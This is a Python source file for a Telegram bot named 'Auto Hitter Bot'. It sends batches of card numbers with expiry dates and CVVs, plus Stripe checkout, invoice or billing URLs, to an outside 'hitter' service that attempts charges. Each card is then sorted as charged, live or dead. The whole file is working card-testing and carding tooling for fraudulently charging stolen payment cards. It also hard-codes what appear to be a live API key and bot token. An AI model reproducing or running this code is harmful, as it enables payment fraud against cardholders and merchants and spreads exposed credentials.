import telebot
import requests

API_URL = "https://hitter1month.replit.app"
API_KEY = "hitchk_1a0dd784f6ef443fb48f2287895e8651fba18b10dfe70b9b"  # get from hitter1month.replit.app/)
BOT_TOKEN = "8322079479:AAHekj5cC6Myirxr9dD7F_cszdaMqqHisaU"

bot = telebot.TeleBot(BOT_TOKEN)
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}

# Store session cache per user to speed up consecutive cards
session_cache = {}

@bot.message_handler(commands=["start"])
def start(msg):
    bot.reply_to(msg, "🔥 Auto Hitter Bot\n\nSend cards (one per line):\n/co <url> <cards>\n/inv <url> <cards>\n/bill <url> <cards>\n\nCard format (one per line):\n4242424242424242|12|26|123\n5500000000000004|06|27|456")

@bot.message_handler(commands=["co"])
def checkout(msg):
    run_hit(msg, "checkout")

@bot.message_handler(commands=["inv"])
def invoice(msg):
    run_hit(msg, "invoice")

@bot.message_handler(commands=["bill"])
def billing(msg):
    run_hit(msg, "billing")

def run_hit(msg, gate):
    parts = msg.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(msg, "Usage: /co <stripe_url> <card|mm|yy|cvv>\n\nFor multiple cards (one per line):\n/co <url> 4242424242424242|12|26|123\n5500000000000004|06|27|456")
        return

    url = parts[1]
    # Split cards by newline to support multiple cards
    cards_raw = parts[2]
    cards = [c.strip() for c in cards_raw.split('\n') if c.strip()]
    
    if not cards:
        bot.reply_to(msg, "❌ No valid cards provided.")
        return
    
    uid = msg.from_user.id
    total_cards = len(cards)
    wait_msg = bot.reply_to(msg, f"⏳ Checking {total_cards} card(s)... (0/{total_cards})")

    results = []
    charged_count = 0
    live_count = 0

    try:
        for idx, card in enumerate(cards, 1):
            # Update progress
            try:
                bot.edit_message_text(
                    f"⏳ Checking {total_cards} card(s)... ({idx-1}/{total_cards})\n"
                    f"✅ Charged: {charged_count} | ⚡ Live: {live_count}",
                    msg.chat.id, wait_msg.message_id
                )
            except:
                pass  # Ignore edit errors

            payload = {
                "url": url,
                "card": card,
                "session_cache": session_cache.get(uid),
            }

            try:
                resp = requests.post(
                    f"{API_URL}/hit/{gate}",
                    json=payload,
                    headers=HEADERS,
                    timeout=120,
                ).json()

                # Save session cache for next card
                if resp.get("session_cache"):
                    session_cache[uid] = resp["session_cache"]

                status = resp.get("status", "error")
                message = resp.get("message", "Unknown")
                elapsed = resp.get("elapsed", 0)

                if status in ["charged", "approved"]:
                    charged_count += 1
                elif status == "live":
                    live_count += 1

                results.append({
                    "card": card,
                    "status": status,
                    "message": message,
                    "elapsed": elapsed
                })

            except Exception as e:
                results.append({
                    "card": card,
                    "status": "error",
                    "message": str(e),
                    "elapsed": 0
                })

        # Build final summary
        icons = {"charged": "✅", "approved": "✅", "live": "⚡", "live_declined": "❌", "error": "⚠️", "dead": "💀"}
        
        lines = [
            f"📊 <b>Results: {charged_count} Charged, {live_count} Live, {total_cards - charged_count - live_count} Dead</b>\n"
        ]
        
        for r in results:
            icon = icons.get(r["status"], "❓")
            # Mask card number for display
            card_display = r["card"]
            if '|' in card_display:
                card_parts = card_display.split('|')
                if len(card_parts[0]) > 6:
                    card_display = card_parts[0][:6] + "******" + card_parts[0][-4:] + "|" + "|".join(card_parts[1:])
            lines.append(f"{icon} <code>{card_display}</code> - {r['status'].upper()}")

        reply = "\n".join(lines)
        
        # Split message if too long (Telegram limit is 4096)
        if len(reply) > 4000:
            reply = reply[:3990] + "\n... (truncated)"
        
        bot.edit_message_text(reply, msg.chat.id, wait_msg.message_id, parse_mode="HTML")

    except Exception as e:
        bot.edit_message_text(f"⚠️ Error: {e}", msg.chat.id, wait_msg.message_id)

bot.infinity_polling()